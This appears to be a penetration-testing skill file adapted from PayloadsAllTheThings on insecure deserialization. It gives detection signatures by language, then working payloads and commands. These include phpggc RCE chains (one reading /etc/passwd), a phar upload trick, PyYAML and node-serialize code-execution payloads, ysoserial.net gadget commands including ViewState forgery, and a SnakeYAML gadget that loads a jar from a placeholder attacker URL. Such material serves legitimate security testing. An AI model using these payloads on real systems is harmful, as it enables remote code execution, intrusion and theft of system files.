---
description: Detection signatures, .NET (ysoserial.net, Json.NET, ViewState), PHP phpggc output and phar, PyYAML/Psych/SnakeYAML gadgets, Ruby Marshal, node-serialize
skill: deserialization-testing
source: PayloadsAllTheThings — Insecure Deserialization
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# Insecure Deserialization Payloads

> Source: PayloadsAllTheThings — Insecure Deserialization

## Detection Signatures

| Language | Hex Header | Base64 Prefix |
|----------|-----------|---------------|
| Java     | `AC ED`   | `rO`          |
| PHP      | `O:`, `a:`, `s:`, `i:` | `Tz`   |
| Python   | `80 04 95` | `gASV`       |
| .NET     | —         | `AAEAAAD`     |
| Ruby     | `04 08`   | `BAgK`        |

## PHP (unserialize)

### RCE via POP Chain

```bash
# Generate base64 payload
phpggc Laravel/RCE1 system 'id' -b

# Generate URL-encoded payload
phpggc Symfony/RCE4 exec 'cat /etc/passwd' -u
```

### Phar Deserialization

```bash
# Trigger via phar:// wrapper (no unserialize() call needed)
# Upload .phar file, then access via: phar://uploads/evil.phar/test
phpggc Monolog/RCE1 exec id -p phar -o evil.phar
```

## YAML Deserialization

- [ ] Ruby Psych `YAML.load()`:
      `!!ruby/object:Gem::Installer\ni: x`
- [ ] Java SnakeYAML:
      `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/exploit.jar"]]]]`
- [ ] .NET YamlDotNet: generally safe, but check custom type converters

### PyYAML RCE

```yaml
# PyYAML < 6.0 with yaml.load() (unsafe loader)
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]
```

## Node.js (node-serialize)

### RCE via IIFE

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

- [ ] Identify `node-serialize`, `serialize-javascript`, or `funcster` usage
- [ ] Check if `JSON.parse` input flows into `eval`, `Function()`, or `vm.runInContext`

## Ruby

- [ ] Identify `Marshal.load`, `YAML.load` (without `safe_load`), or `Oj.load` usage
- [ ] Markers: `\x04\x08` (Marshal magic bytes)
- [ ] Generate payloads via universal-rce-ruby or craft `Marshal.dump` with ERB template gadgets
- [ ] Check Rails `cookies.signed` / `cookies.encrypted` for Marshal-based session stores

## .NET Deserialization

- [ ] Identify formatter: BinaryFormatter, DataContractSerializer, Json.NET
- [ ] Test TypeNameHandling in Json.NET: `"$type":` property injection

### ysoserial.net

```powershell
# BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "whoami" -o base64

# ObjectStateFormatter (ViewState)
ysoserial.exe -g ActivitySurrogateSelector -f ObjectStateFormatter -c "whoami" -o base64

# LosFormatter
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc" -o base64

# Json.Net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "whoami"

# Common gadgets
TypeConfuseDelegate
WindowsIdentity
ActivitySurrogateSelector
PSObject
TextFormattingRunProperties
```

### ViewState Exploitation

```bash
# If machineKey is known
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "whoami" \
  --validationalg="SHA1" \
  --validationkey="KEY" \
  --generator="GENERATOR" \
  --viewstateuserkey="USERKEY" \
  --isdebug
```
